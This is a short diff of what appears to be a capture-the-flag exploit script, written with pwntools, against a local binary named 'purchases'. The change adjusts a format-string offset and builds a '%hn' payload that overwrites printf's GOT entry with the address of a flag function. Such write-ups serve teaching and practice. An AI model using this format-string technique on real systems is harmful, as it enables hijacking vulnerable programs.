@@ -170,11 +170,11 @@ p = process('./purchases')
 print(p.recvuntil('purchase? '))
 
 #: Exploit code
-offset = 8
+offset = 10
 printf_got = 0x404018
 flag_plt = 0x4011b6
 
-payload = '%{}x%10$hn '.format(str(flag_plt))
+payload = '%{}x%{}$hn '.format(str(flag_plt), offset)
 exploit = payload + p64(printf_got)[:3]
 
 #: Send payload
